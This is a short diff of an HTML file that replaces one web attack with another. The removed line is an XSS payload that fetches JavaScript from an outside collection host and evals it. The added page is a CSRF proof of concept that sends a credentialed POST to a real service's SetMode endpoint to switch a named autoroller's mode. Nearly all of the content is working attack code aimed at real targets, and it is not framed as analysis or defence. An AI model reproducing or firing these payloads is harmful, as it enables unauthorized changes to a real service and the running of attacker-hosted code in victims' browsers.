@@ -1,1 +1,22 @@
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/firemar");a.send();</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CSRF PoC - Twirp SetMode</h2>
+
+    <script>
+      fetch("https://autoroll.skia.org/twirp/autoroll.rpc.AutoRollService/SetMode", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          roller_id: "aapt2-chromium",
+          mode: "RUNNING",
+          message: "CSRF_ATTACK"
+        })
+      });
+    </script>
+
+  </body>
+</html>
